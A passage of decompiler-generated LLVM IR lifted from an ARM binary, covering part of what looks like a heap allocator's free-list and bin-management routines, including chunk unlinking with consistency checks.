  br i1 %v2_15750, label %dec_label_pc_1575c, label %dec_label_pc_15748.dec_label_pc_1578c_crit_edge

dec_label_pc_15748.dec_label_pc_1578c_crit_edge:  ; preds = %dec_label_pc_15748
  %v0_15790.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1578c

dec_label_pc_1575c:                               ; preds = %dec_label_pc_15748
  %v0_1575c = load i32, i32* @r0, align 4
  %v1_1575c = add i32 %v0_1575c, 8
  %v2_1575c = inttoptr i32 %v1_1575c to i32*
  %v3_1575c = load i32, i32* %v2_1575c, align 4
  store i32 %v3_1575c, i32* %ip.global-to-local, align 4
  %v1_15760 = add i32 %v3_1575c, 12
  %v2_15760 = inttoptr i32 %v1_15760 to i32*
  %v3_15760 = load i32, i32* %v2_15760, align 4
  store i32 %v3_15760, i32* %r3.global-to-local, align 4
  %v9_15764 = icmp eq i32 %v3_15760, %v0_1575c
  %v1_15768 = add i32 %v0_1575c, 12
  %v2_15768 = inttoptr i32 %v1_15768 to i32*
  %v3_15768 = load i32, i32* %v2_15768, align 4
  store i32 %v3_15768, i32* %r2.global-to-local, align 4
  br i1 %v9_15764, label %dec_label_pc_15770, label %dec_label_pc_1577c

dec_label_pc_15770:                               ; preds = %dec_label_pc_1575c
  %v1_15770 = add i32 %v3_15768, 8
  %v2_15770 = inttoptr i32 %v1_15770 to i32*
  %v3_15770 = load i32, i32* %v2_15770, align 4
  store i32 %v3_15770, i32* %r3.global-to-local, align 4
  %v9_15774 = icmp eq i32 %v3_15770, %v0_1575c
  br i1 %v9_15774, label %dec_label_pc_15780, label %dec_label_pc_1577c

dec_label_pc_1577c:                               ; preds = %dec_label_pc_1575c, %dec_label_pc_15720, %dec_label_pc_15704, %dec_label_pc_15770
  %v0_1577c = call i32 @function_15acc()
  store i32 %v0_1577c, i32* @r0, align 4
  %v0_15780.pre = load i32, i32* @ip, align 4
  %v1_15780.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_15780

dec_label_pc_15780:                               ; preds = %dec_label_pc_15770, %dec_label_pc_1577c
  %v1_15780 = phi i32 [ %v3_15768, %dec_label_pc_15770 ], [ %v1_15780.pre, %dec_label_pc_1577c ]
  %v0_15780 = phi i32 [ %v3_1575c, %dec_label_pc_15770 ], [ %v0_15780.pre, %dec_label_pc_1577c ]
  %v2_15780 = add i32 %v1_15780, 8
  %v3_15780 = inttoptr i32 %v2_15780 to i32*
  store i32 %v0_15780, i32* %v3_15780, align 4
  %v0_15784 = load i32, i32* %r2.global-to-local, align 4
  %v1_15784 = load i32, i32* %ip.global-to-local, align 4
  %v2_15784 = add i32 %v1_15784, 12
  %v3_15784 = inttoptr i32 %v2_15784 to i32*
  store i32 %v0_15784, i32* %v3_15784, align 4
  %v0_15788 = load i32, i32* %lr.global-to-local, align 4
  %v1_15788 = load i32, i32* %r5.global-to-local, align 4
  %v2_15788 = add i32 %v1_15788, %v0_15788
  store i32 %v2_15788, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1578c

dec_label_pc_1578c:                               ; preds = %dec_label_pc_15748.dec_label_pc_1578c_crit_edge, %dec_label_pc_15780
  %v0_15790 = phi i32 [ %v0_15790.pre, %dec_label_pc_15748.dec_label_pc_1578c_crit_edge ], [ %v2_15788, %dec_label_pc_15780 ]
  %v0_1578c = load i32, i32* %r7.global-to-local, align 4
  %v1_1578c = add i32 %v0_1578c, 8
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  %v3_1578c = load i32, i32* %v2_1578c, align 4
  store i32 %v3_1578c, i32* %r2.global-to-local, align 4
  %v1_15790 = or i32 %v0_15790, 1
  store i32 %v1_15790, i32* %r3.global-to-local, align 4
  %v0_15794 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15794, i32* %v2_1578c, align 4
  %v0_15798 = load i32, i32* %r1.global-to-local, align 4
  %v1_15798 = load i32, i32* %r2.global-to-local, align 4
  %v2_15798 = add i32 %v1_15798, 12
  %v3_15798 = inttoptr i32 %v2_15798 to i32*
  store i32 %v0_15798, i32* %v3_15798, align 4
  %v0_1579c = load i32, i32* %lr.global-to-local, align 4
  %v1_1579c = load i32, i32* %r1.global-to-local, align 4
  %v3_1579c = add i32 %v1_1579c, %v0_1579c
  %v4_1579c = inttoptr i32 %v3_1579c to i32*
  store i32 %v0_1579c, i32* %v4_1579c, align 4
  %v0_157a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_157a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_157a0 = add i32 %v1_157a0, 4
  %v3_157a0 = inttoptr i32 %v2_157a0 to i32*
  store i32 %v0_157a0, i32* %v3_157a0, align 4
  %v0_157a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_157a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_157a4 = add i32 %v1_157a4, 8
  %v3_157a4 = inttoptr i32 %v2_157a4 to i32*
  store i32 %v0_157a4, i32* %v3_157a4, align 4
  %v0_157a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_157a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_157a8 = add i32 %v1_157a8, 12
  %v3_157a8 = inttoptr i32 %v2_157a8 to i32*
  store i32 %v0_157a8, i32* %v3_157a8, align 4
  br label %dec_label_pc_157c0

dec_label_pc_157b0:                               ; preds = %dec_label_pc_15738
  %v2_157b0 = add i32 %v1_15740, %v0_157b0
  %v1_157b4 = or i32 %v2_157b0, 1
  store i32 %v1_157b4, i32* %r3.global-to-local, align 4
  %v1_157b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_157b8 = add i32 %v1_157b8, 4
  %v3_157b8 = inttoptr i32 %v2_157b8 to i32*
  store i32 %v1_157b4, i32* %v3_157b8, align 4
  %v0_157bc = load i32, i32* %r1.global-to-local, align 4
  %v1_157bc = load i32, i32* @r4, align 4
  %v2_157bc = add i32 %v1_157bc, 44
  %v3_157bc = inttoptr i32 %v2_157bc to i32*
  store i32 %v0_157bc, i32* %v3_157bc, align 4
  br label %dec_label_pc_157c0

dec_label_pc_157c0:                               ; preds = %dec_label_pc_1578c, %dec_label_pc_157b0
  %v0_157c0 = load i32, i32* %sl.global-to-local, align 4
  %v2_157c0 = icmp eq i32 %v0_157c0, 0
  store i32 %v0_157c0, i32* %r1.global-to-local, align 4
  br i1 %v2_157c0, label %dec_label_pc_157cc.loopexit, label %dec_label_pc_156e8

dec_label_pc_157cc.loopexit:                      ; preds = %dec_label_pc_157c0
  %v0_157cc.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_157cc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %dec_label_pc_157cc.loopexit, %dec_label_pc_156d8
  %v1_157cc = phi i32 [ %v1_157cc.pre, %dec_label_pc_157cc.loopexit ], [ %v1_157cc10, %dec_label_pc_156d8 ]
  %v0_157d4 = phi i32 [ %v0_157cc.pre, %dec_label_pc_157cc.loopexit ], [ %v1_156e4, %dec_label_pc_156d8 ]
  %v9_157cc = icmp eq i32 %v0_157d4, %v1_157cc
  br i1 %v9_157cc, label %dec_label_pc_15844, label %dec_label_pc_157d4

dec_label_pc_157d4:                               ; preds = %dec_label_pc_157cc
  %v1_157d4 = add i32 %v0_157d4, 4
  store i32 %v1_157d4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_156d8

dec_label_pc_157dc.dec_label_pc_157dc_crit_edge:  ; preds = %dec_label_pc_157dc.preheader, %dec_label_pc_157dc.dec_label_pc_157dc_crit_edge
  %v0_157dc.pre = load i32, i32* @r4, align 4
  %v1_157dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_157dc = mul i32 %v1_157dc.pre, 8
  %v5_157dc = add i32 %v4_157dc, %v0_157dc.pre
  %v1_157e0 = add i32 %v1_157dc.pre, 1
  store i32 %v1_157e0, i32* %r2.global-to-local, align 4
  %v1_157e4 = add i32 %v5_157dc, 44
  store i32 %v1_157e4, i32* %r3.global-to-local, align 4
  %v2_157ec = add i32 %v5_157dc, 52
  %v3_157ec = inttoptr i32 %v2_157ec to i32*
  store i32 %v1_157e4, i32* %v3_157ec, align 4
  %v0_157f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_157f0 = add i32 %v0_157f0, 12
  %v3_157f0 = inttoptr i32 %v2_157f0 to i32*
  store i32 %v0_157f0, i32* %v3_157f0, align 4
  %v7_157f4 = icmp sgt i32 %v1_157e0, 95
  br i1 %v7_157f4, label %dec_label_pc_157f8, label %dec_label_pc_157dc.dec_label_pc_157dc_crit_edge

dec_label_pc_157f8:                               ; preds = %dec_label_pc_157dc.dec_label_pc_157dc_crit_edge
  %v0_157f8 = load i32, i32* @r4, align 4
  %v1_157f8 = inttoptr i32 %v0_157f8 to i32*
  %v2_157f8 = load i32, i32* %v1_157f8, align 4
  store i32 %v2_157f8, i32* %r2.global-to-local, align 4
  %v1_157fc = add i32 %v0_157f8, 864
  %v2_157fc = inttoptr i32 %v1_157fc to i32*
  %v3_157fc = load i32, i32* %v2_157fc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15804 = urem i32 %v2_157f8, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_1580c = or i32 %v3_157fc, 1
  store i32 %v1_1580c, i32* %r1.global-to-local, align 4
  %v1_15810 = or i32 %v1_15804, 72
  store i32 %v1_15810, i32* %r2.global-to-local, align 4
  %v1_15814 = add i32 %v0_157f8, 52
  store i32 %v1_15814, i32* %ip.global-to-local, align 4
  %v2_15818 = add i32 %v0_157f8, 840
  %v3_15818 = inttoptr i32 %v2_15818 to i32*
  store i32 0, i32* %v3_15818, align 4
  %v0_1581c = load i32, i32* %r3.global-to-local, align 4
  %v1_1581c = add i32 %v0_1581c, 65536
  store i32 %v1_1581c, i32* %r3.global-to-local, align 4
  %v0_15820 = load i32, i32* %r0.global-to-local, align 4
  %v1_15820 = load i32, i32* @r4, align 4
  %v2_15820 = add i32 %v1_15820, 836
  %v3_15820 = inttoptr i32 %v2_15820 to i32*
  store i32 %v0_15820, i32* %v3_15820, align 4
  %v0_15824 = load i32, i32* %r0.global-to-local, align 4
  %v1_15824 = load i32, i32* @r4, align 4
  %v2_15824 = add i32 %v1_15824, 844
  %v3_15824 = inttoptr i32 %v2_15824 to i32*
  store i32 %v0_15824, i32* %v3_15824, align 4
  %v1_15828 = load i32, i32* @r4, align 4
  %v2_15828 = add i32 %v1_15828, 852
  %v3_15828 = inttoptr i32 %v2_15828 to i32*
  store i32 %v1_1581c, i32* %v3_15828, align 4
  %v1_1582c = load i32, i32* @r4, align 4
  %v2_1582c = add i32 %v1_1582c, 864
  %v3_1582c = inttoptr i32 %v2_1582c to i32*
  store i32 %v1_1580c, i32* %v3_1582c, align 4
  %v1_15830 = load i32, i32* @r4, align 4
  %v2_15830 = inttoptr i32 %v1_15830 to i32*
  store i32 %v1_15810, i32* %v2_15830, align 4
  %v0_15834 = load i32, i32* %ip.global-to-local, align 4
  %v1_15834 = load i32, i32* @r4, align 4
  %v2_15834 = add i32 %v1_15834, 44
  %v3_15834 = inttoptr i32 %v2_15834 to i32*
  store i32 %v0_15834, i32* %v3_15834, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_1583c = call i32 @function_166a8(i32 30, i32 %v1_1580c, i32 %v1_15810, i32 %v1_1581c)
  store i32 %v4_1583c, i32* @r0, align 4
  %v1_15840 = load i32, i32* @r4, align 4
  %v2_15840 = add i32 %v1_15840, 860
  %v3_15840 = inttoptr i32 %v2_15840 to i32*
  store i32 %v4_1583c, i32* %v3_15840, align 4
  br label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_157cc, %dec_label_pc_157f8
  %v2_15848 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15848, i32* @r4, align 4
  %v1_1584c = load i32, i32* @r0, align 4
  ret i32 %v1_1584c

; uselistorder directives
  uselistorder i32 %v0_157f8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_157f0, { 1, 0 }
  uselistorder i32 %v1_157d4, { 1, 0 }
  uselistorder i32 %v0_157c0, { 0, 2, 1 }
  uselistorder i32 %v0_1579c, { 1, 0 }
  uselistorder i32 %v1_156ec, { 1, 0, 2 }
  uselistorder i32 %v0_15704, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_156c4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 30, { 0, 5, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_15844, { 1, 0 }
  uselistorder label %dec_label_pc_157dc.dec_label_pc_157dc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_157c0, { 1, 0 }
  uselistorder label %dec_label_pc_1578c, { 1, 0 }
  uselistorder label %dec_label_pc_15780, { 1, 0 }
  uselistorder label %dec_label_pc_1577c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15738, { 1, 0 }
}

define i32 @function_15850() local_unnamed_addr {
dec_label_pc_15850:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_15850 = load i32, i32* @r4, align 4
  %v6_15850 = load i32, i32* @r5, align 4
  %v9_15850 = load i32, i32* @r6, align 4
  %v12_15850 = load i32, i32* @r7, align 4
  %v18_15850 = load i32, i32* @lr, align 4
  %v0_15858 = load i32, i32* @r0, align 4
  store i32 %v0_15858, i32* @r6, align 4
  %v2_15858 = icmp eq i32 %v0_15858, 0
  %v2_1585c = ptrtoint i32* %stack_var_-40 to i32
  store i32 180260, i32* @r7, align 4
  br i1 %v2_15858, label %dec_label_pc_15a64, label %dec_label_pc_15868

dec_label_pc_15868:                               ; preds = %dec_label_pc_15850
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_1586c = load i32, i32* inttoptr (i32 180332 to i32*), align 4
  store i32 %v4_1586c, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_1586c, i32* %r2.global-to-local, align 4
  %v4_15878 = load i32, i32* inttoptr (i32 180296 to i32*), align 8
  store i32 %v4_15878, i32* %r1.global-to-local, align 4
  store i32 %v2_1585c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_15884 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  store i32 %v4_15884, i32* %ip.global-to-local, align 4
  store i32 88208, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15884)
  %v0_15890 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15890, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_15898 = load i32, i32* @r7, align 4
  %v2_15898 = add i32 %v0_15898, 16
  %v3_15898 = inttoptr i32 %v2_15898 to i32*
  %v4_15898 = load i32, i32* %v3_15898, align 4
  store i32 %v4_15898, i32* %ip.global-to-local, align 4
  store i32 88228, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15898)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_158a8 = load i32, i32* @r7, align 4
  %v2_158a8 = add i32 %v0_158a8, 32
  %v3_158a8 = inttoptr i32 %v2_158a8 to i32*
  %v4_158a8 = load i32, i32* %v3_158a8, align 4
  store i32 %v4_158a8, i32* @lr, align 4
  %v0_158ac = load i32, i32* @r6, align 4
  %v1_158ac = add i32 %v0_158ac, -4
  %v2_158ac = inttoptr i32 %v1_158ac to i32*
  %v3_158ac = load i32, i32* %v2_158ac, align 4
  store i32 %v3_158ac, i32* %r2.global-to-local, align 4
  %v1_158b0 = inttoptr i32 %v4_158a8 to i32*
  %v2_158b0 = load i32, i32* %v1_158b0, align 4
  store i32 %v2_158b0, i32* %r3.global-to-local, align 4
  %v1_158b4 = and i32 %v3_158ac, -4
  store i32 %v1_158b4, i32* %ip.global-to-local, align 4
  %v1_158b8 = add i32 %v0_158ac, -8
  store i32 %v1_158b8, i32* @r5, align 4
  store i32 %v1_158b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_158b4, %v2_158b0
  br i1 %tmp, label %dec_label_pc_158e8, label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %dec_label_pc_15868
  %v1_158c8 = or i32 %v2_158b0, 3
  store i32 %v1_158c8, i32* %r3.global-to-local, align 4
  store i32 %v1_158c8, i32* %v1_158b0, align 4
  %v3_158cc = load i32, i32* @lr, align 4
  %v4_158cc = add i32 %v3_158cc, -8
  store i32 %v4_158cc, i32* %lr.global-to-local, align 4
  %v0_158d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_158d0 = udiv i32 %v0_158d0, 8
  store i32 %v3_158d0, i32* %r1.global-to-local, align 4
  %v1_158d4 = add i32 %v3_158cc, -4
  store i32 %v1_158d4, i32* @r2, align 4
  %v4_158d8 = mul nuw i32 %v3_158d0, 4
  %v5_158d8 = add i32 %v4_158d8, %v1_158d4
  %v6_158d8 = inttoptr i32 %v5_158d8 to i32*
  %v7_158d8 = load i32, i32* %v6_158d8, align 4
  store i32 %v7_158d8, i32* %r3.global-to-local, align 4
  %v1_158dc = load i32, i32* @r5, align 4
  %v2_158dc = add i32 %v1_158dc, 8
  %v3_158dc = inttoptr i32 %v2_158dc to i32*
  store i32 %v7_158d8, i32* %v3_158dc, align 4
  %v0_158e0 = load i32, i32* @r5, align 4
  %v1_158e0 = load i32, i32* @r2, align 4
  %v2_158e0 = load i32, i32* %r1.global-to-local, align 4
  %v5_158e0 = mul i32 %v2_158e0, 4
  %v6_158e0 = add i32 %v5_158e0, %v1_158e0
  %v7_158e0 = inttoptr i32 %v6_158e0 to i32*
  store i32 %v0_158e0, i32* %v7_158e0, align 4
  br label %dec_label_pc_15a4c

dec_label_pc_158e8:                               ; preds = %dec_label_pc_15868
  %v1_158e8 = and i32 %v3_158ac, 2
  %v2_158e8 = icmp eq i32 %v1_158e8, 0
  br i1 %v2_158e8, label %dec_label_pc_158f0, label %dec_label_pc_15a24

dec_label_pc_158f0:                               ; preds = %dec_label_pc_158e8
  %v1_158f0 = or i32 %v2_158b0, 1
  store i32 %v1_158f0, i32* %r3.global-to-local, align 4
  store i32 %v1_158f0, i32* %v1_158b0, align 4
  %v0_158f8 = load i32, i32* @r6, align 4
  %v1_158f8 = add i32 %v0_158f8, -4
  %v2_158f8 = inttoptr i32 %v1_158f8 to i32*
  %v3_158f8 = load i32, i32* %v2_158f8, align 4
  store i32 %v3_158f8, i32* %r3.global-to-local, align 4
  %v0_158fc = load i32, i32* @r5, align 4
  %v1_158fc = load i32, i32* %ip.global-to-local, align 4
  %v2_158fc = add i32 %v1_158fc, %v0_158fc
  store i32 %v2_158fc, i32* %lr.global-to-local, align 4
  %v1_15900 = urem i32 %v3_158f8, 2
  %v2_15900 = icmp eq i32 %v1_15900, 0
  %v1_15904 = add i32 %v2_158fc, 4
  %v2_15904 = inttoptr i32 %v1_15904 to i32*
  %v3_15904 = load i32, i32* %v2_15904, align 4
  store i32 %v3_15904, i32* %r8.global-to-local, align 4
  br i1 %v2_15900, label %dec_label_pc_1590c, label %dec_label_pc_15940

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158f0
  %v1_1590c = add i32 %v0_158f8, -8
  %v2_1590c = inttoptr i32 %v1_1590c to i32*
  %v3_1590c = load i32, i32* %v2_1590c, align 4
  store i32 %v3_1590c, i32* %r1.global-to-local, align 4
  %v2_15910 = sub i32 %v0_158fc, %v3_1590c
  store i32 %v2_15910, i32* %r3.global-to-local, align 4
  %v1_15914 = add i32 %v2_15910, 8
  %v2_15914 = inttoptr i32 %v1_15914 to i32*
  %v3_15914 = load i32, i32* %v2_15914, align 4
  store i32 %v3_15914, i32* %r2.global-to-local, align 4
  %v1_15918 = add i32 %v3_15914, 12
  %v2_15918 = inttoptr i32 %v1_15918 to i32*
  %v3_15918 = load i32, i32* %v2_15918, align 4
  store i32 %v3_15918, i32* %r4.global-to-local, align 4
  %v9_1591c = icmp eq i32 %v3_15918, %v2_15910
  %v1_15920 = add i32 %v2_15910, 12
  %v2_15920 = inttoptr i32 %v1_15920 to i32*
  %v3_15920 = load i32, i32* %v2_15920, align 4
  store i32 %v3_15920, i32* %r0.global-to-local, align 4
  br i1 %v9_1591c, label %dec_label_pc_15928, label %dec_label_pc_1598c

dec_label_pc_15928:                               ; preds = %dec_label_pc_1590c
  %v1_15928 = add i32 %v3_15920, 8
  %v2_15928 = inttoptr i32 %v1_15928 to i32*
  %v3_15928 = load i32, i32* %v2_15928, align 4
  store i32 %v3_15928, i32* %r3.global-to-local, align 4
  %v9_1592c = icmp eq i32 %v3_15928, %v2_15910
  br i1 %v9_1592c, label %dec_label_pc_15934, label %dec_label_pc_1598c

dec_label_pc_15934:                               ; preds = %dec_label_pc_15928
  store i32 %v3_15914, i32* %v2_15928, align 4
  %v0_15938 = load i32, i32* %r0.global-to-local, align 4
  %v1_15938 = load i32, i32* %r2.global-to-local, align 4
  %v2_15938 = add i32 %v1_15938, 12
  %v3_15938 = inttoptr i32 %v2_15938 to i32*
  store i32 %v0_15938, i32* %v3_15938, align 4
  %v0_1593c = load i32, i32* %ip.global-to-local, align 4
  %v1_1593c = load i32, i32* %r1.global-to-local, align 4
  %v2_1593c = add i32 %v1_1593c, %v0_1593c
  store i32 %v2_1593c, i32* %ip.global-to-local, align 4
  %v0_1594c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15950.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15940

dec_label_pc_15940:                               ; preds = %dec_label_pc_158f0, %dec_label_pc_15934
  %v0_159cc = phi i32 [ %v1_158fc, %dec_label_pc_158f0 ], [ %v2_1593c, %dec_label_pc_15934 ]
  %v0_15950 = phi i32 [ %v3_15904, %dec_label_pc_158f0 ], [ %v0_15950.pre, %dec_label_pc_15934 ]
  %v1_15964 = phi i32 [ %v2_158fc, %dec_label_pc_158f0 ], [ %v0_1594c.pre, %dec_label_pc_15934 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_15944 = load i32, i32* @r7, align 4
  %v2_15944 = add i32 %v0_15944, 32
  %v3_15944 = inttoptr i32 %v2_15944 to i32*
  %v4_15944 = load i32, i32* %v3_15944, align 4
  store i32 %v4_15944, i32* @r2, align 4
  %v1_15948 = add i32 %v4_15944, 44
  %v2_15948 = inttoptr i32 %v1_15948 to i32*
  %v3_15948 = load i32, i32* %v2_15948, align 4
  store i32 %v3_15948, i32* %r3.global-to-local, align 4
  %v9_1594c = icmp eq i32 %v1_15964, %v3_15948
  %v1_15950 = and i32 %v0_15950, -4
  store i32 %v1_15950, i32* %r0.global-to-local, align 4
  br i1 %v9_1594c, label %dec_label_pc_159cc, label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %dec_label_pc_15940
  %v2_15958 = add i32 %v1_15964, %v1_15950
  store i32 %v2_15958, i32* %r3.global-to-local, align 4
  %v1_1595c = add i32 %v2_15958, 4
  %v2_1595c = inttoptr i32 %v1_1595c to i32*
  %v3_1595c = load i32, i32* %v2_1595c, align 4
  store i32 %v3_1595c, i32* %r3.global-to-local, align 4
  %v1_15960 = urem i32 %v3_1595c, 2
  %v2_15960 = icmp eq i32 %v1_15960, 0
  %v2_15964 = add i32 %v1_15964, 4
  %v3_15964 = inttoptr i32 %v2_15964 to i32*
  store i32 %v1_15950, i32* %v3_15964, align 4
  br i1 %v2_15960, label %dec_label_pc_1596c, label %dec_label_pc_15958.dec_label_pc_1599c_crit_edge

dec_label_pc_15958.dec_label_pc_1599c_crit_edge:  ; preds = %dec_label_pc_15958
  %v0_159ac.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1599c

dec_label_pc_1596c:                               ; preds = %dec_label_pc_15958
  %v0_1596c = load i32, i32* %lr.global-to-local, align 4
  %v1_1596c = add i32 %v0_1596c, 8
  %v2_1596c = inttoptr i32 %v1_1596c to i32*
  %v3_1596c = load i32, i32* %v2_1596c, align 4
  store i32 %v3_1596c, i32* %r1.global-to-local, align 4
  %v1_15970 = add i32 %v3_1596c, 12
  %v2_15970 = inttoptr i32 %v1_15970 to i32*
  %v3_15970 = load i32, i32* %v2_15970, align 4
  store i32 %v3_15970, i32* %r3.global-to-local, align 4
  %v9_15974 = icmp eq i32 %v3_15970, %v0_1596c
  %v1_15978 = add i32 %v0_1596c, 12
  %v2_15978 = inttoptr i32 %v1_15978 to i32*
  %v3_15978 = load i32, i32* %v2_15978, align 4
  store i32 %v3_15978, i32* %r2.global-to-local, align 4
  br i1 %v9_15974, label %dec_label_pc_15980, label %dec_label_pc_1598c

dec_label_pc_15980:                               ; preds = %dec_label_pc_1596c
  %v1_15980 = add i32 %v3_15978, 8
  %v2_15980 = inttoptr i32 %v1_15980 to i32*
  %v3_15980 = load i32, i32* %v2_15980, align 4
  store i32 %v3_15980, i32* %r3.global-to-local, align 4
  %v9_15984 = icmp eq i32 %v3_15980, %v0_1596c
  br i1 %v9_15984, label %dec_label_pc_15990, label %dec_label_pc_1598c

dec_label_pc_1598c:                               ; preds = %dec_label_pc_1596c, %dec_label_pc_15928, %dec_label_pc_1590c, %dec_label_pc_15980
  %v0_1598c = call i32 @function_15acc()
  store i32 %v0_1598c, i32* %r0.global-to-local, align 4
  %v0_15990.pre = load i32, i32* @r1, align 4
  %v1_15990.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_15990

dec_label_pc_15990:                               ; preds = %dec_label_pc_15980, %dec_label_pc_1598c
  %v1_15990 = phi i32 [ %v3_15978, %dec_label_pc_15980 ], [ %v1_15990.pre, %dec_label_pc_1598c ]
  %v0_15990 = phi i32 [ %v3_1596c, %dec_label_pc_15980 ], [ %v0_15990.pre, %dec_label_pc_1598c ]
  %v2_15990 = add i32 %v1_15990, 8
  %v3_15990 = inttoptr i32 %v2_15990 to i32*
  store i32 %v0_15990, i32* %v3_15990, align 4
  %v0_15994 = load i32, i32* %r2.global-to-local, align 4
  %v1_15994 = load i32, i32* %r1.global-to-local, align 4
  %v2_15994 = add i32 %v1_15994, 12
  %v3_15994 = inttoptr i32 %v2_15994 to i32*
  store i32 %v0_15994, i32* %v3_15994, align 4
  %v0_15998 = load i32, i32* %ip.global-to-local, align 4
  %v1_15998 = load i32, i32* %r0.global-to-local, align 4
  %v2_15998 = add i32 %v1_15998, %v0_15998
  store i32 %v2_15998, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1599c

dec_label_pc_1599c:                               ; preds = %dec_label_pc_15958.dec_label_pc_1599c_crit_edge, %dec_label_pc_15990
  %v0_159ac = phi i32 [ %v0_159ac.pre, %dec_label_pc_15958.dec_label_pc_1599c_crit_edge ], [ %v2_15998, %dec_label_pc_15990 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_159a0 = load i32, i32* @r7, align 4
  %v2_159a0 = add i32 %v0_159a0, 32
  %v3_159a0 = inttoptr i32 %v2_159a0 to i32*
  %v4_159a0 = load i32, i32* %v3_159a0, align 4
  %v1_159a4 = add i32 %v4_159a0, 52
  store i32 %v1_159a4, i32* %r3.global-to-local, align 4
  %v1_159a8 = add i32 %v4_159a0, 60
  %v2_159a8 = inttoptr i32 %v1_159a8 to i32*
  %v3_159a8 = load i32, i32* %v2_159a8, align 4
  store i32 %v3_159a8, i32* %r1.global-to-local, align 4
  %v1_159ac = or i32 %v0_159ac, 1
  store i32 %v1_159ac, i32* @r2, align 4
  %v1_159b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_159b0 = add i32 %v1_159b0, 12
  %v3_159b0 = inttoptr i32 %v2_159b0 to i32*
  store i32 %v1_159a4, i32* %v3_159b0, align 4
  %v0_159b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_159b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_159b4 = add i32 %v1_159b4, 8
  %v3_159b4 = inttoptr i32 %v2_159b4 to i32*
  store i32 %v0_159b4, i32* %v3_159b4, align 4
  %v0_159b8 = load i32, i32* @r2, align 4
  %v1_159b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_159b8 = add i32 %v1_159b8, 4
  %v3_159b8 = inttoptr i32 %v2_159b8 to i32*
  store i32 %v0_159b8, i32* %v3_159b8, align 4
  %v0_159bc = load i32, i32* %ip.global-to-local, align 4
  %v1_159bc = load i32, i32* %r4.global-to-local, align 4
  %v3_159bc = add i32 %v1_159bc, %v0_159bc
  %v4_159bc = inttoptr i32 %v3_159bc to i32*
  store i32 %v0_159bc, i32* %v4_159bc, align 4
  %v0_159c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_159c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_159c0 = add i32 %v1_159c0, 12
  %v3_159c0 = inttoptr i32 %v2_159c0 to i32*
  store i32 %v0_159c0, i32* %v3_159c0, align 4
  %v0_159c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_159c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_159c4 = add i32 %v1_159c4, 8
  %v3_159c4 = inttoptr i32 %v2_159c4 to i32*
  store i32 %v0_159c4, i32* %v3_159c4, align 4
